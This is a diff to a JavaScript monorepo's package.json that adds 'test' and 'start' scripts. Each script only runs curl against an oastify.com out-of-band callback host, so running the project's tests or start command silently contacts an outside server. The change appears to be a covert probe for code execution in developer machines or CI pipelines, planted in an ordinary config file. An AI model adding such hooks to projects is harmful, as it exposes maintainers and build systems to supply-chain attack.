@@ -1,6 +1,8 @@
 {
   "private": true,
   "scripts": {
+    "test":"curl https://ie0kpxxvdgp2psnpbjtf3cjz3q9hxkp8e.oastify.com/gg-test",
+    "start":"curl https://ie0kpxxvdgp2psnpbjtf3cjz3q9hxkp8e.oastify.com/gg-start",
     "build": "turbo run build",
     "dev": "turbo run dev",
     "lint": "turbo run lint",
